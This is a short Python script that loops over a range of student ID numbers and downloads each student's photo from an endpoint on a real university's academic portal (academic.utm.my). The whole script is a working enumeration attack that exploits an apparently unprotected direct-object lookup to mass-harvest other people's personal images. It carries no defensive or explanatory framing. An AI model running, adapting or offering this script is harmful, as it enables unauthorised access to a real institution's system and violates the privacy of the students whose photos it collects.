import requests
year = "2023"
section = "M"
start_month = 1
end_month = 12
start_number = 10000
end_number = 11000
for month in range(start_month, end_month + 1):
    month_str = f"{month:02d}"
    for num in range(start_number, end_number + 1):
        nokp = f"{year}{month_str}{section}{num}"
    
        url = f"https://academic.utm.my/UGStudent/PhotoStudent.ashx?nokp={nokp}"
        response = requests.get(url)

        if response.status_code == 200 and len(response.content) > 100:
            with open(f"{nokp}.jpg", "wb") as f:
                f.write(response.content)
            print(f"Downloaded {nokp}.jpg")
        else:
            print(f"Failed to download {nokp}.jpg")
